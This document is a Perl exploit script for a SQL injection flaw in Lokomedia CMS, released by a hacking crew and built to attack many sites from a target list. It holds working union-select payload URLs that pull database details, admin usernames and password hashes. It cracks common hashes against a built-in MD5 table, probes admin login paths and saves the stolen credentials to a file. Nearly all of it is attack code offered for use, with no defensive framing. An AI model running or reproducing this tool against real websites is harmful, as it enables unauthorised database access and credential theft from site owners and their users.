# Exploit Title :    Lokomedia CMS Remote SQL Injection Exploit Vulnerability
# Exploit Author :   el ZinDYanII-tN
# TargetS :          list.txt :p
# Tested on :        [ WIN 8.1 ]
# dork :              :p
# fb team page :     http://linkshrink.net/7vjXkA
# fb Author :        http://linkshrink.net/7ta538
# video Proof :      http://linkshrink.net/7ZSPhq
# More Exploit :     http://linkshrink.net/7NyfBE
# team :             mandra crew memberZ
# Date:              17/10/2017
######################
# Music :            RedStar Radi - Yohka Anna (يحكى أن )
# Discovered by :    el ZinDYanII-tN
# Greetz :           [ Spawn_Z | SerialBack  | pedro vortex | adminet ]
######################
######################
# DOWNLOAD TOOL :    http://linkshrink.net/7NyfBE
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use Win32::Console::ANSI;
use HTTP::Request::Common qw(GET);
use LWP::UserAgent;
use WWW::Mechanize;  
use Socket;
use HTTP::Request;
use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(POST);
use URI::URL;
use IO::Socket::INET;
$mech = WWW::Mechanize->new(autocheck => 0);
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
my $time    = localtime;
$res="MCMrzlt";if (-e $res){begin();}else{mkdir $res or die "WE CAN NOT CREATE THE BOARD OF DIRECTORS: $res";}
sub begin(){if(@ARGV != 1) { manytofuck(); }else { onetofuck(); }}
sub manytofuck(){if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }system ("title mandra crew web-fucker V2.1");
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";print color('reset');
print colored ("                       [ c0d3d bY ManDra creW membere ]                        ",'white on_red'),"\n";print color('reset');
print colored ("                               [ elZinDYanII-tN ]                              ",'white on_red'),"\n";print color('reset');
print colored ("                              [ Version 2.1 baby ]                             ",'white on_red'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";	print color('reset');									
print colored ("\n                     ___ ___ _____ _______ __          __                    ",'green on_black'),"\n";print color('reset');
print colored ("                    |   Y   | _   |   _   |  |--.-----|  |_                    ",'green on_black'),"\n";print color('reset');
print colored ("                    |.      |.|   |___|   |  _  |  _  |   _|                   ",'green on_black'),"\n";print color('reset');
print colored ("                    |. |_|  `-|.  |_(__   |_____|_____|____|                   ",'green on_black'),"\n";print color('reset');
print colored ("                    |:  |   | |:  |:  1   |  mandra crew                       ",'green on_black'),"\n";print color('reset');
print colored ("                    |::.|:. | |::.|::.. . |  Loko-fucker                       ",'green on_black'),"\n";print color('reset');
print colored ("                    `--- ---' `---`-------'                                    ",'green on_black'),"\n\n"; print color('reset');                           
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";print color('reset');
print colored ("                                  [ thnx f0r ]                                 ",'white on_red'),"\n";print color('reset');
print colored ("               [ Spawn_Z | SerialBack  | pedro vortex | adminet ]              ",'white on_red'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n\n";print color('reset');
print colored ("                       Start At $time                                          ",'white on_black'),"\n";print color('reset');
print "\n\n\n\tPut Ur List Plz : "; 
$list=<STDIN>;
print "\n\n";
open (THETARGET, "<$list") || die "[-] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;
print color("bold white"), "[+] Total sites : ";
print color("bold red"), "".scalar(@TARGETS)."\n\n";
print color('reset');
OUTER: foreach $site(@TARGETS){
chomp($site);
$a++;
lokomedia();
}}
sub onetofuck() {if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }system ("title mandra crew web-fucker V2.1");
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";print color('reset');
print colored ("                       [ c0d3d bY ManDra creW membere ]                        ",'white on_red'),"\n";print color('reset');
print colored ("                               [ elZinDYanII-tN ]                              ",'white on_red'),"\n";print color('reset');
print colored ("                              [ Version 2.1 baby ]                             ",'white on_red'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";	print color('reset');									
print colored ("\n                     ___ ___ _____ _______ __          __                    ",'green on_black'),"\n";print color('reset');
print colored ("                    |   Y   | _   |   _   |  |--.-----|  |_                    ",'green on_black'),"\n";print color('reset');
print colored ("                    |.      |.|   |___|   |  _  |  _  |   _|                   ",'green on_black'),"\n";print color('reset');
print colored ("                    |. |_|  `-|.  |_(__   |_____|_____|____|                   ",'green on_black'),"\n";print color('reset');
print colored ("                    |:  |   | |:  |:  1   |  mandra crew                       ",'green on_black'),"\n";print color('reset');
print colored ("                    |::.|:. | |::.|::.. . |  Loko-fucker                       ",'green on_black'),"\n";print color('reset');
print colored ("                    `--- ---' `---`-------'                                    ",'green on_black'),"\n\n"; print color('reset');                           
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";print color('reset');
print colored ("                                  [ thnx f0r ]                                 ",'white on_red'),"\n";print color('reset');
print colored ("               [ Spawn_Z | SerialBack  | pedro vortex | adminet ]              ",'white on_red'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n\n";print color('reset');
print colored ("                       Start At $time                                          ",'white on_black'),"\n";print color('reset');
  $site = $ARGV[0];
 if($site !~ /https:\/\// && $site !~ /http:\/\// ) { listt(); };
lokomedia();
}
sub listt() {if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }system ("title mandra crew web-fucker V2.1");
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";print color('reset');
print colored ("                       [ c0d3d bY ManDra creW membere ]                        ",'white on_red'),"\n";print color('reset');
print colored ("                               [ elZinDYanII-tN ]                              ",'white on_red'),"\n";print color('reset');
print colored ("                              [ Version 2.1 baby ]                             ",'white on_red'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";	print color('reset');									
print colored ("\n                     ___ ___ _____ _______ __          __                    ",'green on_black'),"\n";print color('reset');
print colored ("                    |   Y   | _   |   _   |  |--.-----|  |_                    ",'green on_black'),"\n";print color('reset');
print colored ("                    |.      |.|   |___|   |  _  |  _  |   _|                   ",'green on_black'),"\n";print color('reset');
print colored ("                    |. |_|  `-|.  |_(__   |_____|_____|____|                   ",'green on_black'),"\n";print color('reset');
print colored ("                    |:  |   | |:  |:  1   |  mandra crew                       ",'green on_black'),"\n";print color('reset');
print colored ("                    |::.|:. | |::.|::.. . |  Loko-fucker                       ",'green on_black'),"\n";print color('reset');
print colored ("                    `--- ---' `---`-------'                                    ",'green on_black'),"\n\n"; print color('reset');                           
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";print color('reset');
print colored ("                                  [ thnx f0r ]                                 ",'white on_red'),"\n";print color('reset');
print colored ("               [ Spawn_Z | SerialBack  | pedro vortex | adminet ]              ",'white on_red'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n\n";print color('reset');
print colored ("                       Start At $time                                          ",'white on_black'),"\n";print color('reset');
$list=$ARGV[0];
open (THETARGET, "<$list") || die "[-] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;
print color("bold white"), "[+] Total sites : ";
print color("bold red"), "".scalar(@TARGETS)."\n\n";
print color('reset');
OUTER: foreach $site(@TARGETS){
chomp($site);
$a++;
lokomedia();
}}
sub lokomedia(){            
print "[+]";
print color("bold white"), "[-lokomedia-]....";
print color('reset');
print " $site\n";
print color('green'),"\n[*]-[*]";
print color('bold green'),"    [Lokomedia DB-scanner V1]\n";
print color('reset');
$lokoversion = "$site/statis--7'union select /*!50000Concat*/(Version())+from+users--+--+kantordesa.html";
$lokodatabase = "$site/statis--7'union select /*!50000Concat*/(Database())+from+users--+--+kantordesa.html";
$lokouserdata = "$site/statis--7'union select /*!50000Concat*/(USER())+from+users--+--+kantordesa.html";
$lokouser = "$site/statis--7'union select /*!50000Concat*/(username)+from+users--+--+kantordesa.html";
$lokopass = "$site/statis--7'union select /*!50000Concat*/(password)+from+users--+--+kantordesa.html";
username();
password();
mysqlversion();
Current_Database();
Current_Username();
lokopanel();
save();
}
sub mysqlversion(){             print color('green'),"  [+] [MySQL Version :    ";
my $checklokoversion = $ua->get("$lokoversion")->content;
if($checklokoversion =~/<meta name="description" content="(.*)">/) {
$dbv=$1;
if($dbv =~ /[a-z]/){
print color('bold white'),"$dbv\n";
print color('reset');
}else {print color('bold red'),"[ERROR]\n";print color('reset');}
}
}
sub Current_Database(){         print color('green'),"  [+] [Current Database : ";
my $checklokodatabase = $ua->get("$lokodatabase")->content;
if($checklokodatabase =~/<meta name="description" content="(.*)">/) {
$db=$1;
print color('bold white'),"$db\n";print color('reset');
}else {print color('bold red'),"[ERROR]\n";print color('reset');}
}
sub Current_Username(){         print color('green'),"  [+] [Current Username : ";
my $checklokouserdata = $ua->get("$lokouserdata")->content;
if($checklokouserdata =~/<meta name="description" content="(.*)">/) {
$udb=$1;
print color('bold white'),"$udb\n";print color('reset');
}else {print color('bold red'),"[ERROR]\n";print color('reset');}
}
sub username(){                 print color('green'),"  [+] [Username :         ";
my $checklokouser = $ua->get("$lokouser")->content;
if($checklokouser =~/<meta name="description" content="(.*)">/) {
$user=$1;
print color('bold white'),"$user\n";print color('reset');
}else {print color('bold red'),"[ERROR]\n";print color('reset');}
}
sub password(){                 print color('green'),"  [+] [Password :         ";
my $checklokopass = $ua->get("$lokopass")->content;
if($checklokopass =~/<meta name="description" content="(.*)">/) {
$hash=$1;
print color('bold white'),"$hash\n";print color('reset');
lokohash();
}else{
 print color('bold red'),"[ERROR]\n";print color('reset');}
}
sub lokohash(){                 print color('green'),"    [-] [hash Password :  ";
$p1="admin123456";
$p2="admin123";
$p3="ADMIN";
$p4="Administrator";
$p5="default";
$p6="pass";
$p7="password";
$p8="test";
$p9="admin";
$p10="demo";
if ($hash =~ /a66abb5684c45962d887564f08346e8d/){
print color('bold white'),"$p1\n";$pass=$p1;}
elsif ($hash =~ /0192023a7bbd73250516f069df18b500/){
print color('bold white'),"$p2\n";$pass=$p2;}
elsif ($hash =~ /73acd9a5972130b75066c82595a1fae3/){
print color('bold white'),"$p3\n";$pass=$p3;}
elsif ($hash =~ /7b7bc2512ee1fedcd76bdc68926d4f7b/){
print color('bold white'),"$p4\n";$pass=$p4;}
elsif ($hash =~ /c21f969b5f03d33d43e04f8f136e7682/){
print color('bold white'),"$p5\n";$pass=$p5;}
elsif ($hash =~ /1a1dc91c907325c69271ddf0c944bc72/){
print color('bold white'),"$p6\n";$pass=$p6;}
elsif ($hash =~ /5f4dcc3b5aa765d61d8327deb882cf99/){
print color('bold white'),"$p7\n";$pass=$p7;}
elsif ($hash =~ /098f6bcd4621d373cade4e832627b4f6/){
print color('bold white'),"$p8\n";$pass=$p8;}
elsif ($hash =~ /21232f297a57a5a743894a0e4a801fc3/){
print color('bold white'),"$p9\n";$pass=$p9;}
elsif ($hash =~ /fe01ce2a7fbac8fafaed7c982a04e229/){
print color('bold white'),"$p10\n";$pass=$p10;}
else{print color('bold red'),"[ERROR]\n";}
}
sub lokopanel(){                print color('green'),"  [+] [Admin Panel :      ";
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);
@lokoadminpath =  ('/redaktur','/adminweb','/administrator','/redaktur/index.php','/adminlogin','/admin','/login.php',);
foreach $lap(@lokoadminpath){
$final=$site.$lap;
my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);
if($response->content =~ /Username/ ||
$response->content =~ /Password/ ||
$response->content =~ /username/ ||
$response->content =~ /password/ ||
$response->content =~ /USERNAME/ ||
$response->content =~ /PASSWORD/ ||
$response->content =~ /Senha/ ||
$response->content =~ /senha/ ||
$response->content =~ /Personal/ ||
$response->content =~ /Usuario/ ||
$response->content =~ /Clave/ ||
$response->content =~ /Usager/ ||
$response->content =~ /usager/ ||
$response->content =~ /Sing/ ||
$response->content =~ /passe/ ||
$response->content =~ /P\/W/ ||
$response->content =~ /Admin Password/
){
print color('bold white'),"$pathone\n";print color('reset');
}else{
print color('bold red'),"[ERROR] $final\n";print color('reset');
}}}
sub save(){
$aa="######################################################################";
open (TEXT, '>>MCMrzlt/loko_db.txt');
print TEXT "$aa\n[*] site : $site\n[+] [MySQL Version] : $dbv\n[+] [Current Database] : $db\n[+] [Current Username] : $udb\n[+] [Username] : $user\n[+] [Password encoded] : $hash\n  [-] [Password Craked] : $pass\n[+] [Admin Panel] : $pathone\n$aa\n";
close (TEXT)
}